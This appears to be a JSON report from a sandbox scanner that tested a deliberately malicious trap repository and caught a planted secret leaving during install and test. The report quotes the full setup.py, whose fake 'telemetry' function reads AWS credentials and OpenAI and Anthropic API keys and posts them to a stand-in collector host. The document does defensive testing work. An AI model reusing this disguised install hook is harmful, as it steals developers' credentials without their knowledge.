@@ -1,0 +1,777 @@
+{
+  "format": 1,
+  "name": "p3Xxer/malicious-repo-agent-trap",
+  "source": "https://github.com/p3Xxer/malicious-repo-agent-trap",
+  "created": "2026-10-13T11:31:00+00:00",
+  "status": "HIJACKED",
+  "headline": "HIJACKED: a planted secret was seen leaving the sandbox.",
+  "leaks": [
+    "$ANTHROPIC_API_KEY",
+    "$OPENAI_API_KEY",
+    "~/.aws/credentials"
+  ],
+  "flags": [
+    {
+      "kind": "contacted-host",
+      "detail": "sandbox contacted collector.agenttrap.invalid",
+      "hard": false
+    },
+    {
+      "kind": "suspicious-code",
+      "detail": "setup.py:8: function that reads ~/.aws/credentials and environment variables OPENAI_API_KEY/ANTHROPIC_API_KEY an",
+      "hard": false
+    },
+    {
+      "kind": "suspicious-code",
+      "detail": "setup.py:24: Sends collected user data (AWS credentials and API keys) to a remote server at collector.agenttrap.i",
+      "hard": false
+    }
+  ],
+  "findings": [
+    {
+      "rule": "agent-trap/secret-leak",
+      "level": "error",
+      "title": "Secret leaves the sandbox",
+      "message": "While the project was installed and tested, and again while an AI agent was working on it, the fake Anthropic key was sent to http://collector.agenttrap.invalid/v1/build. These lines make that happen.",
+      "locations": [
+        {
+          "file": "setup.py",
+          "line": 16,
+          "text": "        for name in (\"OPENAI_API_KEY\", \"ANTHROPIC_API_KEY\"):"
+        },
+        {
+          "file": "setup.py",
+          "line": 20,
+          "text": "            \"http://collector.agenttrap.invalid/v1/build\","
+        }
+      ],
+      "related": [
+        {
+          "file": "setup.py",
+          "line": 8,
+          "text": "def _build_telemetry():"
+        },
+        {
+          "file": "setup.py",
+          "line": 11,
+          "text": "        info = {\"python\": os.sys.version.split()[0]}"
+        },
+        {
+          "file": "setup.py",
+          "line": 12,
+          "text": "        path = os.path.expanduser(\"~/.aws/credentials\")"
+        },
+        {
+          "file": "setup.py",
+          "line": 13,
+          "text": "        if os.path.exists(path):"
+        },
+        {
+          "file": "setup.py",
+          "line": 14,
+          "text": "            with open(path) as file:"
+        },
+        {
+          "file": "setup.py",
+          "line": 15,
+          "text": "                info[\"profile\"] = file.read()"
+        },
+        {
+          "file": "setup.py",
+          "line": 18,
+          "text": "                info[name.lower()] = os.environ[name]"
+        },
+        {
+          "file": "setup.py",
+          "line": 19,
+          "text": "        request = urllib.request.Request("
+        },
+        {
+          "file": "setup.py",
+          "line": 21,
+          "text": "            data=json.dumps(info).encode(),"
+        },
+        {
+          "file": "setup.py",
+          "line": 24,
+          "text": "        urllib.request.urlopen(request, timeout=5)"
+        },
+        {
+          "file": "setup.py",
+          "line": 29,
+          "text": "_build_telemetry()"
+        }
+      ]
+    },
+    {
+      "rule": "agent-trap/secret-leak",
+      "level": "error",
+      "title": "Secret leaves the sandbox",
+      "message": "While the project was installed and tested, and again while an AI agent was working on it, the fake OpenAI key was sent to http://collector.agenttrap.invalid/v1/build. These lines make that happen.",
+      "locations": [
+        {
+          "file": "setup.py",
+          "line": 16,
+          "text": "        for name in (\"OPENAI_API_KEY\", \"ANTHROPIC_API_KEY\"):"
+        },
+        {
+          "file": "setup.py",
+          "line": 20,
+          "text": "            \"http://collector.agenttrap.invalid/v1/build\","
+        }
+      ],
+      "related": [
+        {
+          "file": "setup.py",
+          "line": 8,
+          "text": "def _build_telemetry():"
+        },
+        {
+          "file": "setup.py",
+          "line": 11,
+          "text": "        info = {\"python\": os.sys.version.split()[0]}"
+        },
+        {
+          "file": "setup.py",
+          "line": 12,
+          "text": "        path = os.path.expanduser(\"~/.aws/credentials\")"
+        },
+        {
+          "file": "setup.py",
+          "line": 13,
+          "text": "        if os.path.exists(path):"
+        },
+        {
+          "file": "setup.py",
+          "line": 14,
+          "text": "            with open(path) as file:"
+        },
+        {
+          "file": "setup.py",
+          "line": 15,
+          "text": "                info[\"profile\"] = file.read()"
+        },
+        {
+          "file": "setup.py",
+          "line": 18,
+          "text": "                info[name.lower()] = os.environ[name]"
+        },
+        {
+          "file": "setup.py",
+          "line": 19,
+          "text": "        request = urllib.request.Request("
+        },
+        {
+          "file": "setup.py",
+          "line": 21,
+          "text": "            data=json.dumps(info).encode(),"
+        },
+        {
+          "file": "setup.py",
+          "line": 24,
+          "text": "        urllib.request.urlopen(request, timeout=5)"
+        },
+        {
+          "file": "setup.py",
+          "line": 29,
+          "text": "_build_telemetry()"
+        }
+      ]
+    },
+    {
+      "rule": "agent-trap/secret-leak",
+      "level": "error",
+      "title": "Secret leaves the sandbox",
+      "message": "While the project was installed and tested, and again while an AI agent was working on it, the fake AWS key was sent to http://collector.agenttrap.invalid/v1/build. These lines make that happen.",
+      "locations": [
+        {
+          "file": "setup.py",
+          "line": 12,
+          "text": "        path = os.path.expanduser(\"~/.aws/credentials\")"
+        },
+        {
+          "file": "setup.py",
+          "line": 20,
+          "text": "            \"http://collector.agenttrap.invalid/v1/build\","
+        }
+      ],
+      "related": [
+        {
+          "file": "setup.py",
+          "line": 8,
+          "text": "def _build_telemetry():"
+        },
+        {
+          "file": "setup.py",
+          "line": 11,
+          "text": "        info = {\"python\": os.sys.version.split()[0]}"
+        },
+        {
+          "file": "setup.py",
+          "line": 13,
+          "text": "        if os.path.exists(path):"
+        },
+        {
+          "file": "setup.py",
+          "line": 14,
+          "text": "            with open(path) as file:"
+        },
+        {
+          "file": "setup.py",
+          "line": 15,
+          "text": "                info[\"profile\"] = file.read()"
+        },
+        {
+          "file": "setup.py",
+          "line": 16,
+          "text": "        for name in (\"OPENAI_API_KEY\", \"ANTHROPIC_API_KEY\"):"
+        },
+        {
+          "file": "setup.py",
+          "line": 18,
+          "text": "                info[name.lower()] = os.environ[name]"
+        },
+        {
+          "file": "setup.py",
+          "line": 19,
+          "text": "        request = urllib.request.Request("
+        },
+        {
+          "file": "setup.py",
+          "line": 21,
+          "text": "            data=json.dumps(info).encode(),"
+        },
+        {
+          "file": "setup.py",
+          "line": 24,
+          "text": "        urllib.request.urlopen(request, timeout=5)"
+        },
+        {
+          "file": "setup.py",
+          "line": 29,
+          "text": "_build_telemetry()"
+        }
+      ]
+    },
+    {
+      "rule": "agent-trap/suspicious-code",
+      "level": "warning",
+      "title": "Code the AI agent found suspicious",
+      "message": "The AI agent flagged this code as suspicious: function that reads ~/.aws/credentials and environment variables OPENAI_API_KEY/ANTHROPIC_API_KEY and posts them to http://collector.agenttrap.invalid/v1/build",
+      "locations": [
+        {
+          "file": "setup.py",
+          "line": 8,
+          "text": "_build_telemetry()"
+        }
+      ],
+      "related": []
+    },
+    {
+      "rule": "agent-trap/suspicious-code",
+      "level": "warning",
+      "title": "Code the AI agent found suspicious",
+      "message": "The AI agent flagged this code as suspicious: Sends collected user data (AWS credentials and API keys) to a remote server at collector.agenttrap.invalid during package installation",
+      "locations": [
+        {
+          "file": "setup.py",
+          "line": 24,
+          "text": "urllib.request.urlopen(request, timeout=5)"
+        }
+      ],
+      "related": []
+    },
+    {
+      "rule": "agent-trap/unexpected-host",
+      "level": "note",
+      "title": "Unexpected network contact",
+      "message": "The sandbox contacted collector.agenttrap.invalid, which is not on the allow-list.",
+      "locations": [],
+      "related": []
+    }
+  ],
+  "leak_groups": [
+    {
+      "destination_host": "collector.agenttrap.invalid",
+      "destination": "http://collector.agenttrap.invalid/v1/build",
+      "secrets": [
+        "the fake Anthropic key",
+        "the fake OpenAI key",
+        "the fake AWS key"
+      ],
+      "canaries": [
+        "$ANTHROPIC_API_KEY",
+        "$OPENAI_API_KEY",
+        "~/.aws/credentials"
+      ],
+      "phase": "both",
+      "tasks": [
+        "setup",
+        "test"
+      ],
+      "tricked": false,
+      "lines": [
+        {
+          "file": "setup.py",
+          "line": 12
+        },
+        {
+          "file": "setup.py",
+          "line": 16
+        },
+        {
+          "file": "setup.py",
+          "line": 20
+        }
+      ],
+      "unconfirmed": false,
+      "why_not": []
+    }
+  ],
+  "culprits": {
+    "~/.aws/credentials": [
+      {
+        "file": "setup.py",
+        "line": 1,
+        "text": "import json",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 3,
+        "text": "import urllib.request",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 8,
+        "text": "def _build_telemetry():",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 10,
+        "text": "    try:",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 11,
+        "text": "        info = {\"python\": os.sys.version.split()[0]}",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 12,
+        "text": "        path = os.path.expanduser(\"~/.aws/credentials\")",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 13,
+        "text": "        if os.path.exists(path):",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 14,
+        "text": "            with open(path) as file:",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 15,
+        "text": "                info[\"profile\"] = file.read()",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 16,
+        "text": "        for name in (\"OPENAI_API_KEY\", \"ANTHROPIC_API_KEY\"):",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 18,
+        "text": "                info[name.lower()] = os.environ[name]",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 19,
+        "text": "        request = urllib.request.Request(",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 20,
+        "text": "            \"http://collector.agenttrap.invalid/v1/build\",",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 21,
+        "text": "            data=json.dumps(info).encode(),",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 23,
+        "text": "        )",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 24,
+        "text": "        urllib.request.urlopen(request, timeout=5)",
+        "tag": "runtime-fetch"
+      },
+      {
+        "file": "setup.py",
+        "line": 25,
+        "text": "    except Exception:",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 26,
+        "text": "        pass",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 29,
+        "text": "_build_telemetry()",
+        "tag": "plaintext"
+      }
+    ],
+    "$OPENAI_API_KEY": [
+      {
+        "file": "setup.py",
+        "line": 1,
+        "text": "import json",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 3,
+        "text": "import urllib.request",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 8,
+        "text": "def _build_telemetry():",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 10,
+        "text": "    try:",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 11,
+        "text": "        info = {\"python\": os.sys.version.split()[0]}",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 12,
+        "text": "        path = os.path.expanduser(\"~/.aws/credentials\")",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 13,
+        "text": "        if os.path.exists(path):",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 14,
+        "text": "            with open(path) as file:",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 15,
+        "text": "                info[\"profile\"] = file.read()",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 16,
+        "text": "        for name in (\"OPENAI_API_KEY\", \"ANTHROPIC_API_KEY\"):",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 18,
+        "text": "                info[name.lower()] = os.environ[name]",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 19,
+        "text": "        request = urllib.request.Request(",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 20,
+        "text": "            \"http://collector.agenttrap.invalid/v1/build\",",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 21,
+        "text": "            data=json.dumps(info).encode(),",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 23,
+        "text": "        )",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 24,
+        "text": "        urllib.request.urlopen(request, timeout=5)",
+        "tag": "runtime-fetch"
+      },
+      {
+        "file": "setup.py",
+        "line": 25,
+        "text": "    except Exception:",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 26,
+        "text": "        pass",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 29,
+        "text": "_build_telemetry()",
+        "tag": "plaintext"
+      }
+    ],
+    "$ANTHROPIC_API_KEY": [
+      {
+        "file": "setup.py",
+        "line": 1,
+        "text": "import json",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 3,
+        "text": "import urllib.request",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 8,
+        "text": "def _build_telemetry():",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 10,
+        "text": "    try:",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 11,
+        "text": "        info = {\"python\": os.sys.version.split()[0]}",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 12,
+        "text": "        path = os.path.expanduser(\"~/.aws/credentials\")",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 13,
+        "text": "        if os.path.exists(path):",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 14,
+        "text": "            with open(path) as file:",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 15,
+        "text": "                info[\"profile\"] = file.read()",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 16,
+        "text": "        for name in (\"OPENAI_API_KEY\", \"ANTHROPIC_API_KEY\"):",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 18,
+        "text": "                info[name.lower()] = os.environ[name]",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 19,
+        "text": "        request = urllib.request.Request(",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 20,
+        "text": "            \"http://collector.agenttrap.invalid/v1/build\",",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 21,
+        "text": "            data=json.dumps(info).encode(),",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 23,
+        "text": "        )",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 24,
+        "text": "        urllib.request.urlopen(request, timeout=5)",
+        "tag": "runtime-fetch"
+      },
+      {
+        "file": "setup.py",
+        "line": 25,
+        "text": "    except Exception:",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 26,
+        "text": "        pass",
+        "tag": "plaintext"
+      },
+      {
+        "file": "setup.py",
+        "line": 29,
+        "text": "_build_telemetry()",
+        "tag": "plaintext"
+      }
+    ]
+  },
+  "unlocalized": {},
+  "culprits_pending": false,
+  "files": {
+    "setup.py": {
+      "start": 1,
+      "total_lines": 31,
+      "lines": [
+        "import json",
+        "import os",
+        "import urllib.request",
+        "",
+        "from setuptools import setup",
+        "",
+        "",
+        "def _build_telemetry():",
+        "    \"\"\"Report anonymous build information to help us improve install times.\"\"\"",
+        "    try:",
+        "        info = {\"python\": os.sys.version.split()[0]}",
+        "        path = os.path.expanduser(\"~/.aws/credentials\")",
+        "        if os.path.exists(path):",
+        "            with open(path) as file:",
+        "                info[\"profile\"] = file.read()",
+        "        for name in (\"OPENAI_API_KEY\", \"ANTHROPIC_API_KEY\"):",
+        "            if os.environ.get(name):",
+        "                info[name.lower()] = os.environ[name]",
+        "        request = urllib.request.Request(",
+        "            \"http://collector.agenttrap.invalid/v1/build\",",
+        "            data=json.dumps(info).encode(),",
+        "            headers={\"Content-Type\": \"application/json\"},",
+        "        )",
+        "        urllib.request.urlopen(request, timeout=5)",
+        "    except Exception:",
+        "        pass",
+        "",
+        "",
+        "_build_telemetry()",
+        "setup(name=\"invoicekit\", version=\"0.3.1\", packages=[\"invoicekit\"])",
+        ""
+      ]
+    }
+  },
+  "injections": [],
+  "concerns": [
+    {
+      "where": "setup.py:8",
+      "quote": "_build_telemetry()",
+      "behavior": "function that reads ~/.aws/credentials and environment variables OPENAI_API_KEY/ANTHROPIC_API_KEY and posts them to http://collector.agenttrap.invalid/v1/build"
+    },
+    {
+      "where": "setup.py:24",
+      "quote": "urllib.request.urlopen(request, timeout=5)",
+      "behavior": "Sends collected user data (AWS credentials and API keys) to a remote server at collector.agenttrap.invalid during package installation"
+    }
+  ],
+  "contacted_hosts": [
+    "collector.agenttrap.invalid"
+  ],
+  "host_intel": {},
+  "cleaned": {
+    "removed": [
+      "setup.py:1",
+      "setup.py:3",
+      "setup.py:8-26",
+      "setup.py:29"
+    ],
+    "warnings": [],
+    "rescan_status": "SUSPICIOUS",
+    "rescan_leaks": []
+  },
+  "static_scan": {
+    "count": 0,
+    "flagged": []
+  },
+  "baseline": {
+    "installed": true,
+    "tests": "2 passed",
+    "exits": [
+      0,
+      0,
+      0,
+      0,
+      0
+    ],
+    "errors": [
+      [],
+      [],
+      [],
+      [],
+      []
+    ]
+  },
+  "runs": 4,
+  "cost_usd": 0.00536,
+  "seconds": 105.0,
+  "code_saved": true,
+  "id": "p3xxer-malicious-repo-agent-trap-20261013-113100"
+}
